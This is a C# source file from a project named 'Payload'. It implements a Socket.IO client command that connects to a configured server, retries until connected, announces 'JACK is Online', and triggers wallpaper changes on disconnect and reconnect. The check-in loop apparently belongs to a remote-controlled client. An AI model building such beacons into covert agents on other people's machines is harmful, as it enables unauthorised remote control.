using Payload.Common;
using Payload.Core.Command.SocketClient;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Payload.Common.Config;

namespace Payload.Command.SocketClient
{
    public class SocketIOClientCommand : Payload.Command.Interface.ICommand
    {
        SocketIoClient sic;
        SocketIOClient.SocketIO client;
        bool ReTry = false;
        bool ReTrying = false;

        public SocketIOClientCommand() : base()
        {
            Init();
            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
        }

        private void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            Task.Factory.StartNew(async () =>
            {
               await client?.DisconnectAsync();
            }).Start();
        }

        private void Init()
        {
            try
            {
                base.Interval = TimeSpan.FromMilliseconds(Config.Instance.SocketIOClientCommandDefaultInterval);
                sic = new SocketIoClient(Config.Instance.SocketIOClientCommandServerHost);
                client = sic.client;
                client.OnConnected += Client_OnConnected;
                client.OnDisconnected += Client_OnDisconnected;
                client.OnReconnectError += Client_OnReconnectError;
                client.OnReconnectFailed += Client_OnReconnectFailed;                
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        private void Client_OnReconnectFailed(object sender, EventArgs e)
        {
            startReconnet();
        }

        private void Client_OnReconnectError(object sender, Exception e)
        {
            startReconnet();
        }

        private void Client_OnDisconnected(object sender, string e)
        {            
            startReconnet();
        }
        
        private void startReconnet()
        {
            CommandManager.Instance.AddWallpaperCmd(WallPaper.Mode.AUTO);
            Console.WriteLine(DateTime.Now.ToLongTimeString() + " :: START RETRY");
            if (ReTry || ReTrying)
                return;
            ReTry = true;
            Execute();
        }

        private void Client_OnConnected(object sender, EventArgs e)
        {
            try
            {
                ReTry = false;
                string msg = "TESTING...";
                if (Config.Instance.AppMode.Equals(EnumAppMode.JACK))
                {
                    msg = "JACK is Online";
                }
                client.EmitAsync("message", msg).Wait();
                Console.WriteLine(DateTime.Now.ToLongTimeString() + " :: CONNECTED SERVER");
                if(Config.IsDebug())
                    client.EmitAsync("my_info").Wait();


                CommandManager.Instance.AddWallpaperCmd(WallPaper.Mode.RESET);
                base.SetCommandDone();
            }
            catch
            {

            }
        }

        public override Task Execute()
        {
            Console.WriteLine(DateTime.Now.ToLongTimeString() + " :: START CONNECT SERVER");
            return base.ExecuteNewTask(async () => { await MainTaskAsync(); });
        }

        private async Task MainTaskAsync()
        {
            while (!client.Connected || ReTry)
            {
                Console.WriteLine(DateTime.Now.ToLongTimeString() + " :: WAIT");
                ReTrying = true;
                if (client.Connected)
                    break;
                if (!client.Connected)
                    await client.ConnectAsync();
                await Task.Delay(base.Interval, base.Token);
            }
            Console.WriteLine(DateTime.Now.ToLongTimeString() + " :: DONE");
            ReTrying = false;
        }

    }
}
